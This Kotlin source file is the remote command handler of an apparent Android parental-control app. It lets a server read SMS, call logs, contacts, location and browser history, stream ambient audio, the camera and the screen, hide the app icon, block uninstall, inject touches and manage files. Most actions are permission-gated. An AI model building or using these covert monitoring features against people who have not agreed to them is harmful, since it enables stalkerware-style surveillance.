package org.setbd.control.websocket

import android.content.Context
import android.content.Intent
import android.os.Build
import org.json.JSONArray
import org.json.JSONObject
import org.setbd.control.BuildConfig
import org.setbd.control.controls.BlockActivity
import org.setbd.control.controls.PolicyEngine
import org.setbd.control.devicemanagement.DevicePolicy
import org.setbd.control.monitoring.CommunicationsProvider
import org.setbd.control.monitoring.DeviceInfoProvider
import org.setbd.control.monitoring.InstalledAppsProvider
import org.setbd.control.monitoring.LocationProvider
import org.setbd.control.monitoring.MediaProvider
import org.setbd.control.monitoring.UsageStatsProvider
import org.setbd.control.ui.IconHider
import org.setbd.control.webrtc.CaptureService
import org.setbd.control.webrtc.RtcStarter
import org.setbd.control.webrtc.WebRtcCore
import org.setbd.control.notifications.NotificationHelper
import org.setbd.control.permissions.PermissionManager
import org.setbd.control.storage.SecureStore
import org.setbd.control.sync.SyncWorker
import org.setbd.control.util.Http
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

/**
 * Strict command allowlist — mirrors the Worker. Anything not listed here is
 * rejected with `unknown_action`. No arbitrary execution is possible.
 */
object CommandProcessor {

    val ACTIONS = setOf(
        "ping",
        "get_device_status",
        "get_permission_status",
        "get_installed_apps",
        "get_app_usage",
        "get_location",
        "get_policies",
        "sync_policies",
        "lock_screen",
        "send_notification",
        "trigger_sync",
        // WebRTC remote access (screen mirror / ambient audio / camera)
        "start_screen_mirror",
        "stop_screen_mirror",
        "start_ambient_audio",
        "stop_ambient_audio",
        "start_remote_camera",
        "stop_remote_camera",
        // Optional communications monitoring (permission-gated)
        "get_contacts",
        "get_call_logs",
        "get_sms",
        // Device management
        "set_icon_hidden",
        "allow_uninstall",
        "refresh_hardware",
        "sync_media",           // re-index photos/videos for the parent's media view
        "sync_notifications",   // flush queued notification history right now
        // Parent-pushed overlay: custom text + optional picture, shown NOW
        "force_overlay",
        // On-device preview relay (nothing stored server-side)
        "media_preview",
        "list_files",
        // Chunked whole-file relay for browser playback + downloads
        "read_file",
        // Full file manager (read/write) — All-Files-Access gated on the child
        "write_file",
        "create_dir",
        "delete_path",
        "rename_path",
        "unzip_file",
        // Remote touch assistance for live sessions (accessibility-gated)
        "remote_input",
        // History viewers
        "get_usage_timeline",
        "get_browser_history"
    )

    sealed class Result {
        data class Ok(val payload: JSONObject) : Result()
        data class Failed(val code: String, val message: String) : Result()
    }

    suspend fun handle(ctx: Context, action: String, payload: JSONObject): Result = withContext(Dispatchers.IO) {
        try {
            when (action) {
                "ping" -> Result.Ok(JSONObject().put("pong", true).put("ts", System.currentTimeMillis()))

                "get_device_status" -> Result.Ok(DeviceInfoProvider.statusJson(ctx))

                "get_permission_status" -> Result.Ok(
                    JSONObject().put("permissions", PermissionManager.report(ctx))
                )

                "get_installed_apps" -> {
                    if (!PermissionManager.usageAccessGranted(ctx)) {
                        Result.Failed("missing_permission", "Usage Access is not granted on the child device")
                    } else {
                        Result.Ok(InstalledAppsProvider.reportJson(ctx, payload.optBoolean("includeSystem", false)))
                    }
                }

                "get_app_usage" -> {
                    if (!PermissionManager.usageAccessGranted(ctx)) {
                        Result.Failed("missing_permission", "Usage Access is not granted on the child device")
                    } else {
                        val date = today()
                        val report = UsageStatsProvider.reportJson(ctx, date)
                        // Persist the summary for the dashboard REST view as well.
                        runCatching { uploadUsage(ctx, report) }
                        Result.Ok(report)
                    }
                }

                "get_location" -> {
                    if (!PermissionManager.locationGranted(ctx)) {
                        Result.Failed("missing_permission", "Location permission is not granted on the child device")
                    } else {
                        val report = LocationProvider.reportJson(ctx)
                        if (report == null) Result.Failed("location_unavailable", "Could not get a location fix")
                        else {
                            runCatching { uploadLocation(ctx, report) }
                            Result.Ok(report)
                        }
                    }
                }

                "get_policies" -> Result.Ok(
                    JSONObject().put("policies", policiesJson())
                )

                "sync_policies" -> {
                    val arr = payload.optJSONArray("policies") ?: JSONArray()
                    applyPolicies(ctx, arr)
                    Result.Ok(JSONObject().put("applied", true).put("count", arr.length()))
                }

                "lock_screen" -> {
                    val viaAdmin = DevicePolicy.lockNow(ctx)
                    if (!viaAdmin) {
                        val i = Intent(ctx, BlockActivity::class.java).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                            putExtra("package", ctx.packageName)
                            putExtra("reason", "Requested by parent")
                        }
                        runCatching { ctx.startActivity(i) }
                    }
                    Result.Ok(
                        JSONObject()
                            .put("locked", true)
                            .put("method", if (viaAdmin) "device_admin" else "overlay")
                    )
                }

                "send_notification" -> {
                    val title = payload.optString("title", "Access Control")
                    val body = payload.optString("body", "")
                    NotificationHelper.showAlert(ctx, title, body)
                    Result.Ok(JSONObject().put("shown", true))
                }

                "trigger_sync" -> {
                    SyncWorker.enqueueOneTime(ctx)
                    Result.Ok(JSONObject().put("scheduled", true))
                }

                // ---- WebRTC remote access ----

                "start_screen_mirror" -> {
                    // Screen sharing always requires the system MediaProjection
                    // consent dialog on the child device — never silent.
                    Result.Ok(RtcStarter.requestScreen(ctx))
                }

                "stop_screen_mirror" -> {
                    CaptureService.stopAll(ctx)
                    Result.Ok(JSONObject().put("stopped", true))
                }

                "start_ambient_audio" -> {
                    if (!PermissionManager.micGranted(ctx)) {
                        Result.Failed("missing_permission", "Microphone permission is not granted on the child device")
                    } else {
                        Result.Ok(RtcStarter.requestAmbient(ctx))
                    }
                }

                "stop_ambient_audio" -> {
                    CaptureService.stopAll(ctx)
                    Result.Ok(JSONObject().put("stopped", true))
                }

                "start_remote_camera" -> {
                    if (!PermissionManager.cameraGranted(ctx)) {
                        Result.Failed("missing_permission", "Camera permission is not granted on the child device")
                    } else {
                        val facing = if (payload.optString("facing", "front") == "back") "back" else "front"
                        Result.Ok(RtcStarter.requestCamera(ctx, facing))
                    }
                }

                "stop_remote_camera" -> {
                    CaptureService.stopAll(ctx)
                    Result.Ok(JSONObject().put("stopped", true))
                }

                // ---- Optional communications monitoring ----

                "get_contacts" -> {
                    if (!PermissionManager.contactsGranted(ctx)) {
                        Result.Failed("missing_permission", "Contacts permission is not granted on the child device")
                    } else {
                        Result.Ok(CommunicationsProvider.contactsJson(ctx))
                    }
                }

                "get_call_logs" -> {
                    if (!PermissionManager.phoneGranted(ctx)) {
                        Result.Failed("missing_permission", "Phone/Call Log permission is not granted on the child device")
                    } else {
                        Result.Ok(CommunicationsProvider.callLogsJson(ctx))
                    }
                }

                "get_sms" -> {
                    if (!PermissionManager.smsGranted(ctx)) {
                        Result.Failed("missing_permission", "SMS permission is not granted on the child device")
                    } else {
                        Result.Ok(CommunicationsProvider.smsJson(ctx))
                    }
                }

                // ---- Device management ----

                "set_icon_hidden" -> {
                    val hidden = payload.optBoolean("hidden", !IconHider.isHidden(ctx))
                    IconHider.setHidden(ctx, hidden)
                    Result.Ok(JSONObject().put("hidden", IconHider.isHidden(ctx)))
                }

                "allow_uninstall" -> {
                    // Parent-verified uninstall window: device admin is removed
                    // for N minutes (default 2), then re-armed automatically.
                    val minutes = payload.optInt("minutes", 2).coerceIn(1, 15)
                    DevicePolicy.openUninstallGrace(ctx, minutes)
                    Result.Ok(
                        JSONObject()
                            .put("graceMinutes", minutes)
                            .put("adminActive", DevicePolicy.isAdmin(ctx))
                    )
                }

                "refresh_hardware" -> {
                    val ok = CommandProcessor.uploadHardware(ctx)
                    if (ok) Result.Ok(JSONObject().put("uploaded", true))
                    else Result.Failed("error", "Could not upload the hardware report")
                }

                "sync_media" -> {
                    if (!MediaProvider.available(ctx)) {
                        Result.Failed("missing_permission", "Photos & videos permission is not granted on the child device")
                    } else {
                        val stored = MediaProvider.syncNow(ctx)
                        if (stored >= 0) Result.Ok(JSONObject().put("indexed", stored))
                        else Result.Failed("error", "Media index could not be uploaded")
                    }
                }

                "sync_notifications" -> Result.Ok(JSONObject().put("requested", true))

                // ---- Parent overlay push + browsing/history ----

                "force_overlay" -> {
                    val text = payload.optString("text").take(300)
                    val image = payload.optString("imageB64").take(600_000)
                    if (text.isBlank() && image.isBlank()) {
                        Result.Failed("bad_request", "Overlay text or picture required")
                    } else {
                        val i = Intent(ctx, BlockActivity::class.java).apply {
                            addFlags(
                                Intent.FLAG_ACTIVITY_NEW_TASK or
                                    Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or
                                    Intent.FLAG_ACTIVITY_SINGLE_TOP
                            )
                            putExtra("package", payload.optString("packageName", ctx.packageName))
                            putExtra("reason", "Message from parent")
                            if (text.isNotBlank()) putExtra("custom_text", text)
                            if (image.startsWith("data:image/")) putExtra("custom_image_b64", image)
                        }
                        runCatching { ctx.startActivity(i) }
                        Result.Ok(JSONObject().put("shown", true))
                    }
                }

                "media_preview" -> {
                    if (!org.setbd.control.monitoring.FileBrowserProvider.available(ctx)) {
                        Result.Failed("missing_permission", "Photos & files permission is not granted on the child device")
                    } else {
                        val preview = org.setbd.control.monitoring.FileBrowserProvider.preview(
                            ctx,
                            payload.optString("mediaId").take(60).ifBlank { null },
                            payload.optString("path").take(200).ifBlank { null },
                            payload.optString("name").take(200).ifBlank { null }
                        )
                        if (preview == null) Result.Failed("not_found", "File could not be opened for preview")
                        else if (preview.has("error")) {
                            Result.Failed(preview.optString("error"), "Preview failed on the child device")
                        } else Result.Ok(preview)
                    }
                }

                "list_files" -> {
                    if (!org.setbd.control.monitoring.FileBrowserProvider.available(ctx)) {
                        Result.Failed("missing_permission", "Files permission is not granted on the child device")
                    } else {
                        val zipId = payload.optString("zipId").take(40).ifBlank { null }
                        if (zipId != null) {
                            val listed = org.setbd.control.monitoring.FileBrowserProvider.listZipDir(
                                ctx, zipId, payload.optString("path", "")
                            )
                            if (listed == null) Result.Failed("not_found", "Archive preview has expired — unzip it again")
                            else Result.Ok(listed)
                        } else {
                            Result.Ok(
                                org.setbd.control.monitoring.FileBrowserProvider.listDir(
                                    ctx,
                                    payload.optString("path", "")
                                )
                            )
                        }
                    }
                }

                "read_file" -> {
                    if (!org.setbd.control.monitoring.FileBrowserProvider.available(ctx)) {
                        Result.Failed("missing_permission", "Files permission is not granted on the child device")
                    } else {
                        val zipId = payload.optString("zipId").take(40).ifBlank { null }
                        if (zipId != null) {
                            val chunk = org.setbd.control.monitoring.FileBrowserProvider.readZipChunk(
                                ctx, zipId,
                                payload.optString("path").take(400).ifBlank { "" },
                                payload.optLong("offset", 0L).coerceAtLeast(0L),
                                payload.optInt("maxBytes", 384 * 1024).coerceIn(64 * 1024, 512 * 1024)
                            )
                            if (chunk == null) Result.Failed("not_found", "Archive entry could not be read")
                            else if (chunk.has("error")) Result.Failed(chunk.optString("error"), "Archive entry read failed")
                            else Result.Ok(chunk)
                        } else {
                            val chunk = org.setbd.control.monitoring.FileBrowserProvider.readChunk(
                                ctx,
                                payload.optString("mediaId").take(60).ifBlank { null },
                                payload.optString("path").take(200).ifBlank { null },
                                payload.optString("name").take(200).ifBlank { null },
                                payload.optLong("offset", 0L).coerceAtLeast(0L),
                                payload.optInt("maxBytes", 384 * 1024).coerceIn(64 * 1024, 512 * 1024)
                            )
                            if (chunk == null) Result.Failed("not_found", "File could not be read")
                            else if (chunk.has("error")) {
                                Result.Failed(chunk.optString("error"), "File read failed on the child device")
                            } else Result.Ok(chunk)
                        }
                    }
                }

                // ---- Full file manager: write flows (All-Files-Access gated) ----

                "write_file" -> {
                    val r = org.setbd.control.monitoring.FileBrowserProvider.writeFile(
                        ctx,
                        payload.optString("path", ""),
                        payload.optString("name"),
                        payload.optString("data"),
                        payload.optBoolean("append", false)
                    )
                    if (r.has("error")) Result.Failed(r.optString("error"), "File write failed on the child device")
                    else Result.Ok(r)
                }

                "create_dir" -> {
                    val r = org.setbd.control.monitoring.FileBrowserProvider.createDir(
                        ctx, payload.optString("path", ""), payload.optString("name")
                    )
                    if (r.has("error")) Result.Failed(r.optString("error"), "Folder creation failed on the child device")
                    else Result.Ok(r)
                }

                "delete_path" -> {
                    val r = org.setbd.control.monitoring.FileBrowserProvider.deletePath(
                        ctx, payload.optString("path", ""), payload.optString("name"),
                        payload.optBoolean("isDir", false)
                    )
                    if (r.has("error")) Result.Failed(r.optString("error"), "Delete failed on the child device")
                    else Result.Ok(r)
                }

                "rename_path" -> {
                    val r = org.setbd.control.monitoring.FileBrowserProvider.renamePath(
                        ctx, payload.optString("path", ""), payload.optString("name"),
                        payload.optString("newName")
                    )
                    if (r.has("error")) Result.Failed(r.optString("error"), "Rename failed on the child device")
                    else Result.Ok(r)
                }

                "unzip_file" -> {
                    val r = org.setbd.control.monitoring.FileBrowserProvider.unzip(
                        ctx, payload.optString("path", ""), payload.optString("name")
                    )
                    if (r.has("error")) {
                        val msg = when (r.optString("error")) {
                            "not_a_zip" -> "This file is not a valid ZIP archive"
                            "missing_permission" -> "All-files access is not granted on the child device"
                            "too_many_entries" -> "Archive has too many entries to preview"
                            "too_large" -> "Archive contents exceed the preview size limit"
                            else -> "Unzip failed on the child device"
                        }
                        Result.Failed(r.optString("error"), msg)
                    } else Result.Ok(r)
                }

                "remote_input" -> {
                    val svc = org.setbd.control.controls.BlockAccessibilityService.instance
                    if (svc == null) {
                        Result.Failed(
                            "missing_permission",
                            "Remote touch needs Accessibility enabled on the child device"
                        )
                    } else if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
                        Result.Failed(
                            "unsupported",
                            "This Android version cannot inject remote touches"
                        )
                    } else {
                        Result.Ok(org.setbd.control.controls.RemoteInput.execute(svc, payload))
                    }
                }

                "get_usage_timeline" -> {
                    val days = payload.optInt("days", 3).coerceIn(1, 14)
                    Result.Ok(org.setbd.control.monitoring.UsageTimelineProvider.timeline(ctx, days))
                }

                "get_browser_history" -> {
                    val days = payload.optInt("days", 3).coerceIn(1, 14)
                    val base = org.setbd.control.monitoring.UsageTimelineProvider.browserHistory(ctx, days)
                    Result.Ok(
                        org.setbd.control.monitoring.BrowserCapture.mergeWithCaptured(ctx, base)
                    )
                }

                else -> Result.Failed("unknown_action", "Action \"$action\" is not allowed")
            }
        } catch (e: SecurityException) {
            Result.Failed("missing_permission", e.message ?: "Permission denied")
        } catch (e: Exception) {
            Result.Failed("error", e.message ?: "Command failed")
        }
    }

    fun applyPolicies(ctx: Context, arr: JSONArray) {
        val list = ArrayList<PolicyEngine.Policy>(arr.length())
        for (i in 0 until arr.length()) {
            val o = arr.optJSONObject(i) ?: continue
            list.add(
                PolicyEngine.Policy(
                    id = o.optString("id"),
                    type = o.optString("type"),
                    label = if (o.isNull("label")) null else o.optString("label"),
                    payload = o.optJSONObject("payload") ?: JSONObject(),
                    enabled = o.optBoolean("enabled", true)
                )
            )
        }
        PolicyEngine.replace(list, ctx)
    }

    private fun policiesJson(): JSONArray {
        val arr = JSONArray()
        for (p in PolicyEngine.all()) {
            arr.put(
                JSONObject()
                    .put("id", p.id)
                    .put("type", p.type)
                    .put("label", p.label ?: JSONObject.NULL)
                    .put("payload", p.payload)
                    .put("enabled", p.enabled)
            )
        }
        return arr
    }

    fun today(): String {
        val fmt = java.text.SimpleDateFormat("yyyy-MM-dd", java.util.Locale.US)
        return fmt.format(java.util.Date())
    }

    private suspend fun uploadUsage(ctx: Context, report: JSONObject) {
        val body = JSONObject()
            .put("date", report.optString("date"))
            .put("apps", report.optJSONArray("apps") ?: JSONArray())
        postChild(ctx, "/api/usage/batch", body)
    }

    private suspend fun uploadLocation(ctx: Context, report: JSONObject) {
        postChild(ctx, "/api/location", report)
    }

    /** Full app inventory (icons + usage + install times) for the dashboard Apps view. */
    suspend fun uploadInventory(ctx: Context): Boolean {
        val body = InstalledAppsProvider.buildInventoryJson(ctx)
        return postChild(ctx, "/api/apps/sync", body) != null
    }

    /** Full hardware/sensor report -> devices.hardware. */
    suspend fun uploadHardware(ctx: Context): Boolean {
        val body = DeviceInfoProvider.hardwareJson(ctx)
        return postChild(ctx, "/api/hardware", body) != null
    }

    /** Best-effort structured event into the parent's GUI feed. */
    suspend fun postEvent(ctx: Context, type: String, severity: String, title: String, pkg: String? = null, detail: JSONObject = JSONObject()) {
        val body = JSONObject()
            .put("type", type)
            .put("severity", severity)
            .put("title", title)
        if (!pkg.isNullOrBlank()) body.put("packageName", pkg)
        if (detail.length() > 0) body.put("detail", detail)
        postChild(ctx, "/api/events", body)
    }

    suspend fun postChild(ctx: Context, path: String, body: JSONObject): JSONObject? =
        withContext(Dispatchers.IO) {
            if (!SecureStore.isPaired) return@withContext null
            try {
                val url = "${BuildConfig.API_BASE}$path"
                val text = Http.post(url, SecureStore.deviceToken, body.toString())
                JSONObject(text)
            } catch (e: Exception) {
                null
            }
        }
}
